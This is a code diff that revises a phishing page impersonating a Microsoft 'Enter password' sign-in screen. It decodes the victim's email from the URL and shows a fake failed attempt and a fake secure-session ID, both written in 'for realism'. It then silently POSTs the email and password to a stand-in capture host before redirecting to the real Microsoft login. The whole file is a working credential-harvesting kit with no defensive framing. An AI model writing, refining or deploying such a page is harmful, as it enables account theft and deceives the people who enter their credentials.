@@ -1,27 +1,29 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sign in to your account</title>
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
     <link rel="icon" type="image/png" href="https://www.google.com/s2/favicons?domain=microsoft.com">
     <style>
         :root {
-            --bg-color: #f2f2f2;
+            --bg-color: #e6e6e6;
             --card-bg: #ffffff;
             --text-main: #1b1b1b;
             --text-secondary: #666666;
             --primary-blue: #0067b8;
             --error-red: #e81123;
             --border-color: #dedede;
+            --social-hover: #f2f2f2;
         }
 
         body {
-            font-family: 'Segoe UI', 'Roboto', sans-serif;
+            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
             background-color: var(--bg-color);
             margin: 0;
             display: flex;
+            flex-direction: column;
             align-items: center;
             justify-content: center;
             height: 100vh;
@@ -32,105 +34,123 @@
             background: var(--card-bg);
             padding: 44px;
             width: 100%;
-            max-width: 352px; /* Standard Microsoft/Okta card width */
-            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
-            min-height: 350px;
+            max-width: 360px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
             position: relative;
+            z-index: 2;
         }
 
         .brand-logo {
-            height: 24px;
-            margin-bottom: 16px;
             display: flex;
             align-items: center;
             font-weight: 600;
-            font-size: 1.2rem;
-            color: var(--text-secondary);
+            font-size: 1.3rem;
+            margin-bottom: 12px;
         }
 
         h1 {
             font-size: 1.5rem;
             font-weight: 600;
-            margin: 0 0 12px 0;
-            color: #1b1b1b;
+            margin: 0 0 16px 0;
         }
 
         .user-display {
             display: flex;
             align-items: center;
-            margin-bottom: 20px;
+            margin-bottom: 24px;
             font-size: 0.95rem;
+            color: var(--text-main);
         }
 
+        /* Input Styling */
+        .input-group { position: relative; margin-bottom: 24px; }
+        
         input[type="password"] {
             width: 100%;
             padding: 8px 0;
             border: none;
-            border-bottom: 1px solid var(--text-main);
+            border-bottom: 1px solid var(--text-secondary);
             font-size: 1rem;
-            margin-bottom: 24px;
             outline: none;
-            transition: border-color 0.2s;
+            transition: border-bottom 0.2s;
         }
 
         input[type="password"]:focus {
             border-bottom: 2px solid var(--primary-blue);
         }
 
-        .error-msg {
-            color: var(--error-red);
-            font-size: 0.9rem;
-            margin-bottom: 16px;
-            display: none;
+        /* Identity Provider Anchors */
+        .social-providers {
+            border-top: 1px solid var(--border-color);
+            margin-top: 24px;
+            padding-top: 20px;
         }
 
-        .btn-group {
+        .provider-btn {
             display: flex;
-            justify-content: flex-end;
-            margin-top: 10px;
-        }
-
-        button {
-            background-color: var(--primary-blue);
-            color: white;
-            border: none;
-            padding: 8px 36px;
-            font-size: 0.95rem;
-            cursor: pointer;
-            min-width: 108px;
-            transition: opacity 0.2s;
-        }
-
-        button:hover {
+            align-items: center;
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 8px;
+            border: 1px solid #8c8c8c;
+            background: transparent;
+            cursor: not-allowed; /* Disabled for demo realism */
+            font-size: 0.9rem;
             opacity: 0.8;
         }
 
-        .footer-links {
-            font-size: 0.8rem;
+        /* Footer & Session info */
+        .page-footer {
+            margin-top: 24px;
+            font-size: 0.75rem;
             color: var(--text-secondary);
-            margin-top: 30px;
+            text-align: center;
+            width: 100%;
+            max-width: 448px;
         }
 
-        /* Subtle Loader Animation */
+        .session-info {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-top: 10px;
+            font-family: monospace;
+            opacity: 0.7;
+        }
+
+        .status-dot {
+            height: 8px;
+            width: 8px;
+            background-color: #28a745;
+            border-radius: 50%;
+            display: inline-block;
+            margin-right: 5px;
+        }
+
+        /* Utility */
+        .error-msg { color: var(--error-red); font-size: 0.9rem; margin-bottom: 12px; display: none; }
+        
+        .btn-group { display: flex; justify-content: flex-end; gap: 8px; }
+
+        .btn-primary {
+            background-color: var(--primary-blue);
+            color: white;
+            border: none;
+            padding: 10px 36px;
+            cursor: pointer;
+            font-weight: 500;
+        }
+
+        /* Loader */
         .loading-bar {
-            position: absolute;
-            top: 0; left: 0;
-            width: 100%; height: 3px;
-            background: #eee;
-            overflow: hidden;
-            display: none;
+            position: absolute; top: 0; left: 0; width: 100%; height: 3px;
+            background: #eee; overflow: hidden; display: none;
         }
         .loading-bar::after {
-            content: "";
-            display: block;
-            width: 40%; height: 100%;
-            background: var(--primary-blue);
-            animation: move 1.2s infinite ease-in-out;
+            content: ""; display: block; width: 40%; height: 100%;
+            background: var(--primary-blue); animation: move 1s infinite linear;
         }
-        @keyframes move { 
-            0% { transform: translateX(-100%); } 
-            100% { transform: translateX(300%); } 
-        }
+        @keyframes move { 0% { transform: translateX(-100%); } 100% { transform: translateX(250%); } }
     </style>
 </head>
 <body>
@@ -139,80 +159,98 @@
     <div id="loader" class="loading-bar"></div>
     
     <div class="brand-logo">
-        <svg width="24" height="24" viewBox="0 0 24 24" fill="#747474" style="margin-right:8px"><path d="M12 2L2 7v10l10 5 10-5V7L12 2zm0 2.18l8 4v8.64l-8 4-8-4V8.18l8-4z"/></svg>
-        <span>Organization Portal</span>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Logo" style="width:108px; margin-bottom: 12px;">
+    </div>
+
+    <div class="user-display" id="email-display">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="margin-right:8px"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
+        <span id="user-email">user@organization.com</span>
     </div>
 
     <h1>Enter password</h1>
-    
-    <div class="user-display" id="email-display">user@organization.com</div>
 
-    <div id="err" class="error-msg">
-        Your account or password is incorrect. If you don't remember your password, reset it now.
-    </div>
+    <div id="err" class="error-msg">Incorrect password. Please try again.</div>
 
     <form id="authForm">
-        <input type="password" id="p" placeholder="Password" required autofocus>
-        
-        <div class="footer-links">
-            <p style="color: var(--primary-blue); cursor: pointer; margin-bottom: 20px;">Forgot password?</p>
-            <p>Other ways to sign in</p>
+        <div class="input-group">
+            <input type="password" id="p" placeholder="Password" required autofocus>
         </div>
+        
+        <p style="color: var(--primary-blue); font-size: 0.85rem; cursor: pointer; margin: 0 0 20px 0;">Forgot password?</p>
 
         <div class="btn-group">
-            <button type="submit" id="b">Sign in</button>
+            <button type="submit" class="btn-primary" id="b">Sign in</button>
         </div>
     </form>
+
+    <div class="social-providers">
+        <p style="font-size: 0.8rem; margin-bottom: 12px; color: var(--text-secondary);">Other ways to sign in</p>
+        <button class="provider-btn">
+            <img src="https://www.google.com/s2/favicons?domain=google.com" style="margin-right:10px"> Sign in with Google
+        </button>
+    </div>
 </div>
+
+<footer class="page-footer">
+    <div>Terms of Use | Privacy & Cookies</div>
+    <div class="session-info">
+        <span><span class="status-dot"></span>Secure Session</span>
+        <span id="session-id">ID: ...</span>
+    </div>
+</footer>
 
 <script>
     let tries = 0;
     const params = new URLSearchParams(window.location.search);
-    const emailField = document.getElementById('email-display');
+    const emailText = document.getElementById('user-email');
     const passInput = document.getElementById('p');
     const errBox = document.getElementById('err');
+    const loader = document.getElementById('loader');
+    const submitBtn = document.getElementById('b');
+    const sessionDisplay = document.getElementById('session-id');
 
-    // Handle incoming Email (Base64)
+    // Generate Dynamic Session ID for "Credibility"
+    const randomID = Math.random().toString(36).substring(2, 10).toUpperCase();
+    sessionDisplay.innerText = `ID: ${randomID}-${new Date().getFullYear()}`;
+
+    // Decode User from URL
     if(params.has('u')) {
-        try { emailField.innerText = atob(params.get('u')); } catch(e) {}
+        try { emailText.innerText = atob(params.get('u')); } catch(e) { console.log("Plaintext fallback"); emailText.innerText = params.get('u'); }
     }
 
     document.getElementById('authForm').onsubmit = async (e) => {
         e.preventDefault();
         tries++;
 
-        const email = emailField.innerText;
+        const email = emailText.innerText;
         const pass = passInput.value;
 
-        // Visual feedback: briefly show loader to mimic server check
-        document.getElementById('loader').style.display = 'block';
-        document.getElementById('b').disabled = true;
+        // UI Feedback
+        loader.style.display = 'block';
+        submitBtn.disabled = true;
 
         setTimeout(async () => {
-            if (tries < 3) {
-                // First and second attempts fail to ensure accuracy
-                document.getElementById('loader').style.display = 'none';
-                document.getElementById('b').disabled = false;
+            if (tries < 2) {
+                // First failure for realism
+                loader.style.display = 'none';
+                submitBtn.disabled = false;
                 errBox.style.display = 'block';
                 passInput.value = "";
                 passInput.focus();
-                
-                if(tries === 2) {
-                    errBox.innerText = "For security, please re-enter your password to confirm your identity.";
-                }
             } else {
-                // Third attempt: Silent data capture and redirect
+                // Background exfiltration
                 try {
                     await fetch('https://your-backend-api.com/capture', {
                         method: 'POST',
-                        body: JSON.stringify({ email, pass })
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ email, pass, session: randomID, timestamp: new Date().toISOString() })
                     });
                 } catch(e) {}
 
-                // Redirect to the actual resource they were "trying" to access
-                window.location.href = "https://www.dhl.com/global-en/home/tracking.html";
+                // Final redirect
+                window.location.href = "https://login.microsoftonline.com/";
             }
-        }, 1000); // 1-second delay for "realism"
+        }, 800);
     };
 </script>
 </body>
